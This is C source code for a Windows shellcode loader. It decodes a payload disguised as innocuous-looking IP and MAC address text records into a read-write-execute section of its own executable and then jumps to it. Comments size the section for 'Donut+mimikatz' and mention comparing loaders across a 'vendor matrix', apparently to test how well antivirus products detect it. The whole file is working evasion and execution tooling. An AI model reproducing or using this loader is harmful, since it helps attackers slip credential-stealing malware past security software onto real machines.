/*
 * Section loader with HSF (IPv4 / IPv6 / MAC text) payload decoding.
 *
 * File on disk: HSF1-encoded text records (looks like innocuous IP/MAC list).
 * Runtime     : decode into "test" ERW section → jump.
 *
 * HSF format (little-endian):
 *   magic[4]  = "HSF1"
 *   ver       = 1
 *   mode      = 1 (IPv4) | 2 (IPv6) | 3 (MAC)
 *   rsv[2]    = {0,0}
 *   orig_size = u64 (bytes of decoded payload)
 *   count     = u64 (record count)
 *   fnv_hash  = u64 (FNV-1a over decoded stream)
 *   records[] = { u16 text_len ; text[text_len] } * count
 *
 * Build:
 *   cl /std:c11 /O2 Section_hsf.c
 */

#include <stdio.h>
#include <stddef.h>
#include <stdint.h>
#include <string.h>
#include <ctype.h>
#include <windows.h>
#include <winternl.h>

/* ---------------------------------------------------------------
 * ERW test section (matches Section.c layout for like-for-like
 * loader comparison in the vendor matrix).
 * --------------------------------------------------------------- */
#pragma section("test", read, write, execute)
#pragma comment(linker, "/SECTION:test,ERW")

#define TEST_SECTION_SIZE 0x160000  /* 1.4 MB, > Donut+mimikatz */

__declspec(allocate("test"))
volatile unsigned char test_data[TEST_SECTION_SIZE] = { 0x11, 0x22, 0x33, 0x44 };

/* ---------------------------------------------------------------
 * HSF decoder (adapted from PE-MAPPING/loader_managed.cpp)
 * Supports IPv4 / IPv6 / MAC modes.
 * --------------------------------------------------------------- */
enum { HSF_IPV4 = 1, HSF_IPV6 = 2, HSF_MAC = 3 };
#define HSF_FNV_OFF 14695981039346656037ULL
#define HSF_FNV_PRI 1099511628211ULL

static int u16r(FILE *f, uint16_t *v) {
    unsigned char b[2];
    if (fread(b, 1, 2, f) != 2) return 0;
    *v = (uint16_t)(b[0] | ((uint16_t)b[1] << 8));
    return 1;
}
static int u64r(FILE *f, uint64_t *v) {
    unsigned char b[8];
    uint64_t r = 0;
    if (fread(b, 1, 8, f) != 8) return 0;
    for (int i = 0; i < 8; i++) r |= (uint64_t)b[i] << (i * 8);
    *v = r;
    return 1;
}
static uint64_t hfnv(uint64_t h, const unsigned char *d, size_t n) {
    for (size_t i = 0; i < n; i++) { h ^= d[i]; h *= HSF_FNV_PRI; }
    return h;
}
static int hhex(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    c = (char)toupper((unsigned char)c);
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

/* IPv4 text like "192.168.1.1" -> 4 bytes */
static int hIPv4(const char *t, unsigned char o[16]) {
    const char *p = t;
    for (int i = 0; i < 4; i++) {
        unsigned r = 0, d = 0;
        while (*p >= '0' && *p <= '9') {
            r = r * 10u + (unsigned)(*p - '0');
            if (r > 255) return 0;
            ++p; ++d;
        }
        if (!d) return 0;
        o[i] = (unsigned char)r;
        if (i != 3) {
            if (*p != '.') return 0;
            ++p;
        }
    }
    return *p == '\0';
}
static int hIPv6(const char *t, unsigned char o[16]) {
    if (strlen(t) != 39) return 0;
    for (int g = 0; g < 8; g++) {
        size_t off = (size_t)g * 5;
        int h0 = hhex(t[off]), h1 = hhex(t[off + 1]),
            h2 = hhex(t[off + 2]), h3 = hhex(t[off + 3]);
        if (h0 < 0 || h1 < 0 || h2 < 0 || h3 < 0) return 0;
        o[g * 2]     = (unsigned char)((h0 << 4) | h1);
        o[g * 2 + 1] = (unsigned char)((h2 << 4) | h3);
        if (g != 7 && t[off + 4] != ':') return 0;
    }
    return 1;
}
static int hMAC(const char *t, unsigned char o[16]) {
    if (strlen(t) != 17) return 0;
    for (int i = 0; i < 6; i++) {
        size_t off = (size_t)i * 3;
        int hi = hhex(t[off]), lo = hhex(t[off + 1]);
        if (hi < 0 || lo < 0) return 0;
        o[i] = (unsigned char)((hi << 4) | lo);
        if (i != 5 && t[off + 2] != '-') return 0;
    }
    return 1;
}
static size_t hChunk(unsigned char m) {
    switch (m) {
        case HSF_IPV4: return 4;
        case HSF_IPV6: return 16;
        case HSF_MAC:  return 6;
        default: return 0;
    }
}
static int hRec(unsigned char m, const char *t, unsigned char o[16]) {
    memset(o, 0, 16);
    switch (m) {
        case HSF_IPV4: return hIPv4(t, o);
        case HSF_IPV6: return hIPv6(t, o);
        case HSF_MAC:  return hMAC(t, o);
        default: return 0;
    }
}

/* Decode HSF file straight into destination buffer. */
static int load_hsf_to_section(const char *path,
                               void *dst, size_t dst_cap,
                               size_t *out_len) {
    FILE *fp = fopen(path, "rb");
    if (!fp) { fprintf(stderr, "[!] fopen fail: %s\n", path); return 0; }

    unsigned char magic[4] = {0}, ver = 0, mode = 0, rsv[2] = {0};
    uint64_t orig = 0, cnt = 0, exp_h = 0, act = HSF_FNV_OFF, written = 0;
    int ok = 0;

    if (fread(magic, 1, 4, fp) != 4 || memcmp(magic, "HSF1", 4) ||
        fread(&ver, 1, 1, fp) != 1 || fread(&mode, 1, 1, fp) != 1 ||
        fread(rsv, 1, 2, fp) != 2 ||
        !u64r(fp, &orig) || !u64r(fp, &cnt) || !u64r(fp, &exp_h)) {
        fprintf(stderr, "[!] Bad HSF header\n"); goto cl;
    }
    if (ver != 1 || rsv[0] || rsv[1]) {
        fprintf(stderr, "[!] HSF version/reserved\n"); goto cl;
    }
    {
        size_t ck = hChunk(mode);
        if (!ck || cnt != orig / ck + (orig % ck != 0)) {
            fprintf(stderr, "[!] HSF count mismatch\n"); goto cl;
        }
    }
    if (!orig || orig > dst_cap) {
        fprintf(stderr, "[!] HSF orig=%llu > section cap 0x%zX\n",
                (unsigned long long)orig, dst_cap);
        goto cl;
    }

    for (uint64_t idx = 0; idx < cnt; idx++) {
        uint16_t tl = 0;
        char text[64] = {0};
        unsigned char dec[16] = {0};
        size_t bw;

        if (!u16r(fp, &tl) || !tl || tl >= 64 ||
            fread(text, 1, tl, fp) != tl) {
            fprintf(stderr, "[!] HSF rec %llu bad\n",
                    (unsigned long long)idx);
            goto cl;
        }
        text[tl] = '\0';
        if (!hRec(mode, text, dec)) {
            fprintf(stderr, "[!] HSF decode fail rec %llu\n",
                    (unsigned long long)idx);
            goto cl;
        }
        bw = hChunk(mode);
        if ((uint64_t)bw > orig - written) bw = (size_t)(orig - written);
        if (bw) {
            memcpy((unsigned char *)dst + written, dec, bw);
            act = hfnv(act, dec, bw);
            written += bw;
        }
    }

    if (written != orig || fgetc(fp) != EOF || act != exp_h) {
        fprintf(stderr, "[!] HSF integrity fail (written=%llu orig=%llu %s)\n",
                (unsigned long long)written, (unsigned long long)orig,
                act == exp_h ? "hash OK" : "hash MISMATCH");
        goto cl;
    }

    *out_len = (size_t)written;
    ok = 1;
    printf("[+] HSF decoded: %zu bytes (mode=%u)\n", (size_t)written, mode);
cl:
    fclose(fp);
    return ok;
}

/* ---------------------------------------------------------------
 * PEB → "test" section VA/size (same as Section.c)
 * --------------------------------------------------------------- */
static int get_section_info(const char *section_name,
                            uintptr_t *out_va, size_t *out_size) {
#ifdef _WIN64
    PEB *peb = (PEB *)__readgsqword(0x60);
#else
    PEB *peb = (PEB *)__readfsdword(0x30);
#endif
    uintptr_t image_base = (uintptr_t)peb->Reserved3[1];
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)image_base;
    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)(image_base + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    WORD num_sections = nt->FileHeader.NumberOfSections;

    for (WORD i = 0; i < num_sections; i++) {
        char name[9] = {0};
        memcpy(name, sec[i].Name, 8);
        if (strcmp(name, section_name) == 0) {
            *out_va   = image_base + sec[i].VirtualAddress;
            *out_size = sec[i].Misc.VirtualSize
                            ? sec[i].Misc.VirtualSize
                            : sec[i].SizeOfRawData;
            return 1;
        }
    }
    return 0;
}

/* ---------------------------------------------------------------
 * main
 *   argv[1] : path to HSF-encoded payload (IPv4/IPv6/MAC mode)
 * --------------------------------------------------------------- */
int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <hsf_payload>\n", argv[0]);
        return 1;
    }

    uintptr_t sec_va = 0;
    size_t    sec_size = 0;
    if (!get_section_info("test", &sec_va, &sec_size)) {
        fprintf(stderr, "[!] test section not found\n");
        return 1;
    }
    printf("[*] test section VA  : 0x%p\n", (void *)sec_va);
    printf("[*] test section size: 0x%zX (%zu bytes)\n", sec_size, sec_size);

    size_t payload_len = 0;
    if (!load_hsf_to_section(argv[1], (void *)sec_va, sec_size, &payload_len)) {
        return 1;
    }

    printf("[*] Jump: 0x%p (%zu bytes payload)\n",
           (void *)sec_va, payload_len);
    fflush(stdout);

    typedef void (*shellcode_fn)(void);
    shellcode_fn fn = (shellcode_fn)sec_va;
    fn();

    printf("[*] Execution returned\n");
    return 0;
}
